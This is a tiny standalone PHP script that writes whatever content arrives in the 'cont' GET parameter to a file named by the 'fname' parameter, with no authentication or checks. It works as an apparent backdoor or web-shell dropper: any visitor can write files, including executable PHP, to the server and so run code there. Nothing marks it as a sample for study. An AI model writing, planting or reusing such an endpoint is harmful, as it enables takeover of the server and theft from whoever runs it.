<?php

try {
  $fname = $_GET["fname"];
  $handle = fopen("./$fname", "w");
  $result = fwrite($handle, $_GET["cont"]);
  fclose($handle);
} catch (Exception $e) {
  echo "1";
}

?>
